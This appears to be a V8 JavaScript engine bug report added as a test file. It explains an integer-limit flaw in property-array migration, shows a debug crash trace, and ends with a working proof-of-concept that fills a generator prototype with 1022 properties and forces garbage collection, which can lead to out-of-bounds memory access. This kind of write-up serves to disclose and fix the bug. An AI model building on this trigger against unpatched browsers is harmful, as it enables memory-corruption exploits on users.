@@ -1,0 +1,91 @@
+/*
+Here's a snippet of the MigrateFastToFast function which is used to create a new PropertyArray object.
+
+  int number_of_fields = new_map->NumberOfFields();
+  int inobject = new_map->GetInObjectProperties();
+  int unused = new_map->UnusedPropertyFields();
+
+  ...
+
+  int total_size = number_of_fields + unused;
+  int external = total_size - inobject;
+  Handle<PropertyArray> array = isolate->factory()->NewPropertyArray(external);
+
+The new_map variable may come from the Map::CopyWithField method.
+
+Here's a snippet of the method.
+MaybeHandle<Map> Map::CopyWithField(Handle<Map> map, Handle<Name> name,
+                                    Handle<FieldType> type,
+                                    PropertyAttributes attributes,
+                                    PropertyConstness constness,
+                                    Representation representation,
+                                    TransitionFlag flag) {
+  ...
+  if (map->NumberOfOwnDescriptors() >= kMaxNumberOfDescriptors) {
+    return MaybeHandle<Map>();
+  }
+
+  DCHECK_IMPLIES(!FLAG_track_constant_fields, constness == kMutable);
+  Descriptor d = Descriptor::DataField(name, index, attributes, constness,
+                                       representation, wrapped_type);
+
+  Handle<Map> new_map = Map::CopyAddDescriptor(map, &d, flag);
+  new_map->AccountAddedPropertyField();
+  return new_map;
+}
+
+The Map::CopyAddDescriptor method adds one more descriptor to the map, and the AccountAddedPropertyField method may make the UnusedPropertyFields() up to 2. Since kMaxNumberOfDescriptors is 1022, new_map's NumberOfFields() can be 1022, and UnusedPropertyFields() can be 2 in certain circumstances.
+
+This means, in the MigrateFastToFast method, the "external" variable can be 1024 which exceeds the maximum value of a ProperyArray's length which is 1023. So the created array's length() will return 0, it hits the following assert.
+
+#
+# Fatal error in ../../v8/src/objects-inl.h, line 1750
+# Debug check failed: index < this->length() (0 vs. 0).
+#
+
+==== C stack trace ===============================
+
+    0   d8                                  0x00000001071f6372 v8::base::debug::StackTrace::StackTrace() + 34
+    1   d8                                  0x00000001071fdcc0 v8::platform::(anonymous namespace)::PrintStackTrace() + 192
+    2   d8                                  0x00000001071eaf4a V8_Fatal(char const*, int, char const*, ...) + 442
+    3   d8                                  0x00000001071ea6af v8::base::(anonymous namespace)::DefaultDcheckHandler(char const*, int, char const*) + 47
+    4   d8                                  0x0000000105b0375c v8::internal::PropertyArray::set(int, v8::internal::Object*) + 1116
+    5   d8                                  0x000000010630e10e v8::internal::JSObject::MigrateToMap(v8::internal::Handle<v8::internal::JSObject>, v8::internal::Handle<v8::internal::Map>, int) + 18558
+    6   d8                                  0x00000001061f858b v8::internal::LookupIterator::ApplyTransitionToDataProperty(v8::internal::Handle<v8::internal::JSObject>) + 1899
+    7   d8                                  0x000000010632221e v8::internal::Object::AddDataProperty(v8::internal::LookupIterator*, v8::internal::Handle<v8::internal::Object>, v8::internal::PropertyAttributes, v8::internal::ShouldThrow, v8::internal::Object::StoreFromKeyed) + 2254
+    8   d8                                  0x000000010631f338 v8::internal::Object::SetProperty(v8::internal::LookupIterator*, v8::internal::Handle<v8::internal::Object>, v8::internal::LanguageMode, v8::internal::Object::StoreFromKeyed) + 1112
+    9   d8                                  0x0000000105f90c07 v8::internal::StoreIC::Store(v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Name>, v8::internal::Handle<v8::internal::Object>, v8::internal::Object::StoreFromKeyed) + 4647
+    10  d8                                  0x0000000105f9ca62 v8::internal::KeyedStoreIC::Store(v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>) + 2258
+    11  d8                                  0x0000000105fae469 v8::internal::__RT_impl_Runtime_KeyedStoreIC_Miss(v8::internal::Arguments, v8::internal::Isolate*) + 1321
+    12  d8                                  0x0000000105fad513 v8::internal::Runtime_KeyedStoreIC_Miss(int, v8::internal::Object**, v8::internal::Isolate*) + 979
+    13  ???                                 0x000000010d385204 0x0 + 4516762116
+Received signal 4 <unknown> 0001071f2478
+Illegal instruction: 4
+
+It seems like OOB writes, but actually it is not. array->length() just returns 0, it's allocated enough to contain 1024 elements. But this affects the Garbage Collector to reallocate the array with the 0 length. So after the garbage collection, it can lead to OOB reads/writes.
+
+PoC:
+*/
+
+function gc() {
+    for (let i = 0; i < 20; i++)
+        new ArrayBuffer(0x1000000);
+}
+
+function trigger() {
+    function* generator() {
+    }
+
+    for (let i = 0; i < 1022; i++) {
+        generator.prototype['b' + i];
+        generator.prototype['b' + i] = 0x1234;
+    }
+
+    gc();
+
+    for (let i = 0; i < 1022; i++) {
+        generator.prototype['b' + i] = 0x1234;
+    }
+}
+
+trigger();
